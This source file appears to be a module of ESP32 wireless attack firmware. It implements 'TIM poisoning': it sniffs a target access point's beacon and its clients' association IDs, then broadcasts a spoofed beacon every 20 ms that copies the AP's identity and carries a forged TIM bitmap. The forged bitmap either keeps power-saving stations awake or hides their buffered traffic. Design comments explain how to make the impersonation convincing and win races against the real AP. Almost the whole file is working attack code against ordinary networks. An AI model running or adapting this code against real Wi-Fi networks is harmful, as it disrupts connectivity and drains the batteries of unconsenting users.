// TIM poisoning through a cloned beacon.
//
// Design notes (why it is shaped this way):
//   * The clone has to be believable: same BSSID, same SSID, same RSN IE, same
//     capability and beacon interval as the real AP, otherwise a station drops it
//     as a different (or downgraded) network. Everything except the TIM element is
//     learned from a real beacon of the target.
//   * A real AP beacons every 100 TU (~102 ms). The clone is sent every 20 ms so
//     it wins the race most of the time without turning the channel into a pure
//     jammer -- the station still has to receive it as the AP's own beacon.
//   * TIM: the partial virtual bitmap is indexed by AID, not by station number:
//     bit j of byte i carries AID 8*i+j, so AID 1 sits in bit 1 of byte 0 and bit
//     0 of byte 0 is AID 0 -- the group-addressed traffic indication, which is
//     what the Bitmap Control field repeats as its "traffic indicator" bit.
//     (Wireshark decodes it the same way: aid = 8*x + 8*i + j with x = 2*offset.)
//     DTIM count is forced to 0 = "this beacon is a DTIM", i.e. the station wakes
//     fully every single time.
//   * The 8 byte timestamp of the clone is left at zero on purpose: the MAC fills
//     it with the interface's own TSF (0 while the station interface is not
//     associated), so anything we wrote there would never reach the air. Measured
//     with lab/cap_frames.py (测试报告 §4.4.3); that is why the TSF half of this
//     module was removed instead of kept behind a WARN.
//   * TIM, by contrast, is transmitted exactly as built: DTIM count/period, bitmap
//     control and the partial virtual bitmap are all ours on the air.
//   * AIDs are learned from Association/Reassociation Responses of the target BSS
//     (capability, status, AID at offset 28..29, masked to 14 bits).

#include "tim.h"
#include "radio.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "ie_util.h"
#include "tx_guard.h"

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;

// 20 ms: ~5x the real 100 TU beacon rate. Enough to win most races, far from a
// jammer. Broadcast frames are not acknowledged, so the driver frees the buffer
// immediately and this rate does not touch the unicast pool limit (tx_guard.h).
const uint32_t kBeaconMs = 20;
const int kMaxClients = 8;
// The partial virtual bitmap is capped at 32 bytes, i.e. AID <= 255 (the standard
// allows up to 2007, but every deployment seen in practice is far below): the cap
// keeps the clone inside one small frame.
const uint16_t kMaxAid = 255;

tim_mode_t s_mode = TIM_OFF;
uint8_t s_bssid[6];
uint8_t s_channel;
char s_ssid[33];
uint8_t s_ssid_len;
uint16_t s_capability;
uint16_t s_beacon_interval;
uint8_t s_dtim_period;
uint8_t s_rsn[64];
uint8_t s_rsn_len;
bool s_have_beacon;
uint32_t s_last_tick;

uint16_t s_aid_arg;
uint32_t s_frames;
uint32_t s_real_beacons;

struct aid_entry_t {
    uint8_t mac[6];
    uint16_t aid;
};

aid_entry_t s_clients[kMaxClients];
int s_client_count;

int find_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

void note_aid(const uint8_t* mac, uint16_t aid) {
    aid &= 0x3FFF;  // bits 14..15 are reserved
    if (aid == 0 || (mac[0] & 0x01) != 0 || memcmp(mac, s_bssid, 6) == 0) {
        return;
    }
    const int found = find_client(mac);
    if (found >= 0) {
        s_clients[found].aid = aid;
        return;
    }
    if (s_client_count >= kMaxClients) {
        return;
    }
    memcpy(s_clients[s_client_count].mac, mac, 6);
    s_clients[s_client_count].aid = aid;
    s_client_count++;
}

// Target beacon parameters: everything the clone has to copy verbatim.
void learn_beacon(const uint8_t* frame, uint16_t len) {
    if (len < 38) {
        return;
    }
    s_beacon_interval = (uint16_t)(frame[32] | (frame[33] << 8));
    s_capability = (uint16_t)(frame[34] | (frame[35] << 8));
    s_real_beacons++;

    const uint8_t* ies = frame + 36;
    const uint8_t* end = frame + len;

    uint16_t ie_len = 0;
    const uint8_t* ssid = ie_find(ies, end, 0, &ie_len);
    if (ssid != nullptr && ie_len <= 32) {
        memcpy(s_ssid, ssid, ie_len);
        s_ssid[ie_len] = 0;
        s_ssid_len = (uint8_t)ie_len;
    }
    const uint8_t* rsn = ie_find(ies, end, 48, &ie_len);
    if (rsn != nullptr && s_rsn_len == 0 && ie_len + 2 <= sizeof(s_rsn)) {
        s_rsn[0] = 48;
        s_rsn[1] = (uint8_t)ie_len;
        memcpy(s_rsn + 2, rsn, ie_len);
        s_rsn_len = (uint8_t)(ie_len + 2);
    }
    const uint8_t* tim = ie_find(ies, end, 5, &ie_len);
    if (tim != nullptr && ie_len >= 3) {
        s_dtim_period = tim[1];  // the period is copied; the count is always 0
    }
    if (s_capability != 0) {
        // A hidden-SSID AP beacons with an empty SSID element, so the SSID length
        // is not part of the "we have a usable reference" test.
        s_have_beacon = true;
    }
}

// TIM element body. `forced_aid` 0 = use every learned AID; TIM_CLEAR mode sends
// an empty bitmap instead.
size_t build_tim(uint8_t* out, uint16_t forced_aid) {
    size_t n = 0;
    out[n++] = 5;  // element id: TIM
    const size_t len_pos = n++;
    out[n++] = 0;  // DTIM count 0 = this beacon is a DTIM, so every station wakes
    out[n++] = s_dtim_period != 0 ? s_dtim_period : 2;

    if (s_mode == TIM_CLEAR) {
        out[n++] = 0x00;  // bitmap control: no group traffic, offset 0
        out[n++] = 0x00;  // partial virtual bitmap: nobody has anything buffered
        out[len_pos] = (uint8_t)(n - len_pos - 1);
        return n;
    }
    uint8_t bitmap[32];
    memset(bitmap, 0, sizeof(bitmap));
    int highest_byte = -1;
    if (forced_aid > 0) {
        const uint16_t aid = forced_aid > kMaxAid ? kMaxAid : forced_aid;
        const int byte_index = aid / 8;
        bitmap[byte_index] |= (uint8_t)(1u << (aid % 8));
        highest_byte = byte_index;
    } else {
        for (int i = 0; i < s_client_count; i++) {
            const uint16_t aid = s_clients[i].aid;
            if (aid == 0 || aid > kMaxAid) {
                continue;
            }
            const int byte_index = aid / 8;
            bitmap[byte_index] |= (uint8_t)(1u << (aid % 8));
            if (byte_index > highest_byte) {
                highest_byte = byte_index;
            }
        }
    }

    if (s_mode == TIM_SET && highest_byte < 0) {
        // Nothing learned yet: light up AID 1 so the element is still a valid
        // "there is buffered traffic" hint instead of an empty bitmap.
        bitmap[0] = 0x02;  // AID 1 = bit 1 (bit 0 is AID 0, the group address)
        highest_byte = 0;
    }
    const int bytes = highest_byte < 0 ? 1 : highest_byte + 1;
    out[n++] = 0x00;  // bitmap control: offset 0, traffic indicator 0
    for (int i = 0; i < bytes; i++) {
        out[n++] = bitmap[i];
    }
    out[len_pos] = (uint8_t)(n - len_pos - 1);
    return n;
}

// The cloned beacon: same fixed parameters as the real AP, TIM tampered.
size_t build_beacon(uint8_t* frame) {
    memset(frame, 0, 256);
    size_t n = 0;
    frame[n++] = 0x80;  // beacon
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memcpy(frame + n, kBroadcast, 6);
    n += 6;
    memcpy(frame + n, s_bssid, 6);
    n += 6;
    memcpy(frame + n, s_bssid, 6);
    n += 6;
    frame[n++] = kSeqHigh;
    frame[n++] = kSeqLow;

    n += 8;  // timestamp: written by the MAC, not by us (see the header comment)
    const uint16_t interval = s_beacon_interval != 0 ? s_beacon_interval : 100;
    frame[n++] = (uint8_t)(interval & 0xFF);
    frame[n++] = (uint8_t)(interval >> 8);
    const uint16_t cap = s_capability != 0 ? s_capability : 0x0411;
    frame[n++] = (uint8_t)(cap & 0xFF);
    frame[n++] = (uint8_t)(cap >> 8);

    // SSID
    frame[n++] = 0;
    frame[n++] = s_ssid_len;
    memcpy(frame + n, s_ssid, s_ssid_len);
    n += s_ssid_len;
    // Supported rates (the same ladder the CSA clone uses: it is only there so
    // the frame looks like a beacon and not like a bare header).
    static const uint8_t kRates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    frame[n++] = 1;
    frame[n++] = sizeof(kRates);
    memcpy(frame + n, kRates, sizeof(kRates));
    n += sizeof(kRates);
    // DS parameter set
    frame[n++] = 3;
    frame[n++] = 1;
    frame[n++] = s_channel;

    n += build_tim(frame + n, s_aid_arg);

    if (s_rsn_len > 0 && n + s_rsn_len < 240) {
        memcpy(frame + n, s_rsn, s_rsn_len);
        n += s_rsn_len;
    }
    return n;
}

}  // namespace

bool tim_start(int index, tim_mode_t mode, uint16_t aid) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    const String ssid = WiFi.SSID(index);
    s_ssid_len = (uint8_t)(ssid.length() > 32 ? 32 : ssid.length());
    memcpy(s_ssid, ssid.c_str(), s_ssid_len);
    s_ssid[s_ssid_len] = 0;
    s_channel = WiFi.channel(index);

    s_mode = (mode == TIM_CLEAR) ? TIM_CLEAR : TIM_SET;
    s_aid_arg = aid;
    s_frames = 0;
    s_real_beacons = 0;
    s_client_count = 0;
    s_rsn_len = 0;
    s_have_beacon = false;
    s_capability = 0;
    s_beacon_interval = 0;
    s_dtim_period = 0;

    radio_set_channel("tim", s_channel);
    // The clone is worthless without the target's beacon parameters and the
    // victims' AIDs, and both come from the sniffer.
    attack_sniffer_enable();
    s_last_tick = millis() - kBeaconMs;
    return true;
}

void tim_stop(void) {
    s_mode = TIM_OFF;
}

void tim_step(void) {
    if (s_mode == TIM_OFF) {
        return;
    }
    // Nothing is transmitted before a real beacon of the target has been decoded:
    // a clone with SSID "", TIM period 2 and timestamp 0 is not an impersonation,
    // it is a new (broken) network and stations ignore it. The wait is typically
    // one beacon interval, ~100 ms.
    if (!s_have_beacon) {
        return;
    }
    const uint32_t now = millis();
    if (now - s_last_tick < kBeaconMs) {
        return;
    }
    s_last_tick = now;
    uint8_t frame[256];
    const size_t len = build_beacon(frame);
    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
    }
}

void tim_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_mode == TIM_OFF || len < 24 || type != 0) {
        return;
    }
    const uint8_t* src = frame + 10;
    const bool from_ap = memcmp(src, s_bssid, 6) == 0;

    if (from_ap && subtype == 8) {  // beacon
        learn_beacon(frame, len);
        return;
    }
    if (from_ap && (subtype == 1 || subtype == 3) && len >= 30) {
        // Association / Reassociation Response: capability, status, AID.
        note_aid(frame + 4, (uint16_t)(frame[28] | (frame[29] << 8)));
    }
}

void tim_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    if (s_ssid_len == 0) {
        memcpy(s_ssid, "TIMTEST", 7);
        s_ssid_len = 7;
    }
    if (s_channel == 0) {
        s_channel = 6;
    }
    // The dump has to be reproducible: whatever the sniffer learned from the live
    // BSS is put aside and one fake AID 3 is used, so the expected bytes do not
    // depend on what happened to be on the air before `TIMTEST` ran.
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    const int saved_count = s_client_count;
    aid_entry_t saved[kMaxClients];
    memcpy(saved, s_clients, sizeof(saved));
    memset(s_clients, 0, sizeof(s_clients));
    memcpy(s_clients[0].mac, fake_sta, 6);
    s_clients[0].aid = 3;
    s_client_count = 1;
    if (s_capability == 0) {
        s_capability = 0x0411;
    }
    if (s_beacon_interval == 0) {
        s_beacon_interval = 100;
    }
    if (s_dtim_period == 0) {
        s_dtim_period = 2;
    }

    uint8_t tim[40];
    const size_t tim_len = build_tim(tim, s_aid_arg);
    Serial.printf("TIMTEST tim len=%u id=%u dtim_count=%u dtim_period=%u bmp_ctrl=0x%02X",
                  (unsigned)tim_len, (unsigned)tim[0], (unsigned)tim[2], (unsigned)tim[3],
                  (unsigned)tim[4]);
    Serial.print(" bitmap=");
    for (size_t i = 5; i < tim_len; i++) {
        Serial.printf("%02X", tim[i]);
    }
    uint32_t mask = 0;
    for (size_t i = 5; i < tim_len && i < 9; i++) {
        mask |= ((uint32_t)tim[i]) << (8 * (i - 5));
    }
    Serial.printf(" bmp_mask=0x%08X\n", (unsigned)mask);

    uint8_t frame[256];
    const size_t len = build_beacon(frame);
    Serial.printf("TIMTEST beacon len=%u interval=%u cap=0x%04X rsn=%u ssid=%s\n",
                  (unsigned)len, (unsigned)(frame[32] | (frame[33] << 8)),
                  (unsigned)(frame[34] | (frame[35] << 8)), (unsigned)s_rsn_len, s_ssid);
    Serial.print("TIMTEST beacon hex=");
    for (size_t i = 0; i < len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    memcpy(s_clients, saved, sizeof(saved));
    s_client_count = saved_count;
}

bool tim_active(void) {
    return s_mode != TIM_OFF;
}

const char* tim_mode_name(void) {
    switch (s_mode) {
        case TIM_SET:
            return "tim";
        case TIM_CLEAR:
            return "clear";
        default:
            return "off";
    }
}

uint32_t tim_frames(void) {
    return s_frames;
}

uint32_t tim_real_beacons(void) {
    return s_real_beacons;
}

uint32_t tim_aid_mask(void) {
    uint32_t mask = 0;
    for (int i = 0; i < s_client_count; i++) {
        const uint16_t aid = s_clients[i].aid;
        if (aid >= 1 && aid <= 32) {
            mask |= 1u << (aid - 1);
        }
    }
    return mask;
}

uint32_t tim_clients(void) {
    return (uint32_t)s_client_count;
}

uint16_t tim_aid(void) {
    return s_aid_arg;
}

uint8_t tim_dtim_period(void) {
    return s_dtim_period;
}

bool tim_have_target(void) {
    return s_have_beacon;
}
